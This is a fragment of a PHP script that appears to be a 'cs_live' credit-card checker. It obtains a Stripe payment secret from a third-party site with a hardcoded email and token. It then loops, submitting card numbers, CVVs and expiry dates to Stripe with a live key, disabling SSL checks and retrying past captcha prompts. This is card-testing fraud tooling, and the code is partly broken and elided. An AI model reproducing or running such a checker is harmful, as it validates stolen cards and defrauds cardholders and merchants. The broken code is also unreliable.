...
###################################[cs_live take]#####################
   ...
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.email-extractor.io/extension/autosavepayprepare');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: www.email-extractor.io',
               'method: POST',
               'path: /extension/autosavepayprepare',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://www.email-extractor.io',
               'referer: https://www.email-extractor.io/extension/autosave/token/4b86de12e67a9222d3ef44f2225ae70ebe4ea2434953acb40fb14f72c6b7bf3',
        ...
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=yadavsahil1836%40gmail.com&token=4b86de12e67a9222d3ef44f2225ae70ebe4ea2434953acb40fb14f72c6b7bf3&plan=autosave');
...
// // echo $r1; // The response from the server
 $client_secret = Getstr($r1,'{"secret":"','"');
   
 $pi = Getstr($r1,'{"secret":"','_secret');
$x = 0;  
while(true)  
{  
   ...
   $ch = curl_init();
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]=yadavsahil1836%40gmail.com&payment_method_data[billing_details][email]=yadavsahil1836%40gmail.com&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=d0bf9c61-e089-4607-99cb-02a5524b9e26ead1b1&payment_method_data[muid]=bab32e2a-af23-47dd-a3c7-b69c50fa90c686e291&payment_method_data[sid]=0b767389-b7fc-47d9-9d59-663572d713c4fccbd4&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Ff90f36a9b%3B+stripe-js-v3%2Ff90f36a9b&payment_method_data[time_on_page]=44808&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_SaTePrhturh1Vrqa27L4OM5M&client_secret='.$client_secret.'');
        
        $r2 = curl_exec($ch);

if (strpos($result1, "site_key"))   
{  
    $x++;  
    continue;  
}  
